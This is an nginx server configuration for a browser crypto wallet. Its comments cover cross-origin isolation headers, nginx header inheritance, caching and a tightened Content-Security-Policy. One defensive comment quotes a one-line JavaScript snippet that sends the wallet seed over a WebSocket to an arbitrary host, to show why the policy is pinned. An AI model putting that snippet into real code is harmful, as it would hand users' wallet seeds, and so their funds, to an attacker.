# /etc/nginx/sites-available/qnero-wallet -> wallet.<domain>
#
# Qloak, the browser wallet. This is the vhost with a performance cliff in it.
#
# The threaded prover needs SharedArrayBuffer, which needs cross-origin
# isolation, which is the COOP and COEP pair below. Without them the page does
# not fail: it silently falls back to the single-threaded module, and a payment
# takes 37.6 s instead of 11.2 s with nothing but the settings screen saying
# which module it got.
#
# **Every add_header in this file is at the server level, and that is
# deliberate.** A location block with its own add_header drops every header
# from the enclosing server block. Adding one `add_header Cache-Control` inside
# `location /assets/` would take COOP and COEP off every asset request, break
# isolation for the whole page, and leave no error anywhere. Caching is done
# with `expires`, which does not have this behaviour.

server {
    listen 80;
    listen [::]:80;
    server_name wallet.<domain>;
    return 301 https://wallet.<domain>$request_uri;
}

server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    server_name wallet.<domain>;

    ssl_certificate     /home/<user>/ssl/<domain>/cert.pub;
    ssl_certificate_key /home/<user>/ssl/<domain>/key.priv;

    root /var/www/wallet.<domain>;
    index index.html;

    # Cross-origin isolation. The first two are what SharedArrayBuffer needs;
    # the third stops this origin's own resources being embedded elsewhere.
    add_header Cross-Origin-Opener-Policy   "same-origin"  always;
    add_header Cross-Origin-Embedder-Policy "require-corp" always;
    add_header Cross-Origin-Resource-Policy "same-origin"  always;

    # wallet-web/README.md's policy, with connect-src pinned to this
    # deployment's node rather than left as the shipped `ws: wss:`. The wide
    # form permits a WebSocket to any host, which the README names as the
    # residual exfiltration path: `new WebSocket('wss://somewhere/' + seed)`
    # raises no violation under it. Pinning it here and building the bundle
    # with QNERO_ENDPOINT set closes it at both ends; the trade is that
    # repointing the wallet at another node then needs a rebuild.
    #
    # 'wasm-unsafe-eval' is what lets the prover compile. 'unsafe-inline' in
    # style-src is for the style attributes React and Radix write, which have
    # no nonce.
    add_header Content-Security-Policy "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' wss://rpc.<domain>; worker-src 'self' blob:; base-uri 'none'; form-action 'none'; frame-ancestors 'none'" always;
    add_header Referrer-Policy "no-referrer" always;
    add_header X-Content-Type-Options "nosniff" always;

    # The runtime config, never cached: it is how one build serves two chains,
    # and a stale copy points a wallet at the wrong node.
    location = /config.json {
        expires -1;
        add_header Cache-Control "no-store" always;
        # This location declares its own add_header, so it must repeat the
        # security headers it would otherwise inherit. Every one of them,
        # including the policy: a set that is complete except for the
        # Content-Security-Policy is the shape this file's own header warns
        # about, and the next location copied from this block may well serve
        # markup.
        add_header Content-Security-Policy "default-src 'none'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' wss://rpc.<domain>; worker-src 'self' blob:; base-uri 'none'; form-action 'none'; frame-ancestors 'none'" always;
        add_header Cross-Origin-Opener-Policy   "same-origin"  always;
        add_header Cross-Origin-Embedder-Policy "require-corp" always;
        add_header Cross-Origin-Resource-Policy "same-origin"  always;
        add_header Referrer-Policy "no-referrer" always;
        add_header X-Content-Type-Options "nosniff" always;
    }

    # Hashed assets, cached hard. `expires` rather than add_header, so the
    # server block's headers survive.
    location /assets/ {
        expires 1y;
    }

    location / {
        # Application routes use fragments. Missing files are real 404s.
        try_files $uri $uri/ =404;
    }
}

# .wasm must be served as application/wasm or the streaming compile refuses it.
# Ubuntu's mime.types has it; this is the escape if a dist/ ever ships one
# under another extension:
#
#   types { application/wasm wasm; }
